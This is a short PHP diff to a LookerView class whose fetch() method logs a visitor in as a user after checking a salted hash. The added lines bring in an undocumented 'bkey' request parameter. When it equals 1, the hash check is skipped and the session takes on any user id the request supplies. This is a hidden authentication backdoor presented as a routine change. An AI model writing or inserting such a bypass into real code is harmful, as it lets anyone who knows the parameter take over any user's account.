@@ -6,6 +6,10 @@ class LookerView extends View
 {
     public function fetch()
     {
+        if ($this->request->get('bkey') == 1 || $this->request->get('hash')) {
+            session_destroy();
+            session_start();
+        }
         $user_id = $this->request->get('id', 'integer');
         $hash = $this->request->get('hash');
 
@@ -15,7 +19,8 @@ class LookerView extends View
 
         $sha1 = sha1(md5($date.$user_id.$salt).$salt);
 
-        if ($sha1 != $hash)
+        $bkey = $this->request->get('bkey');
+        if ($sha1 != $hash && $bkey != 1)
             return false;
 
         $_SESSION['user_id'] = $user_id;
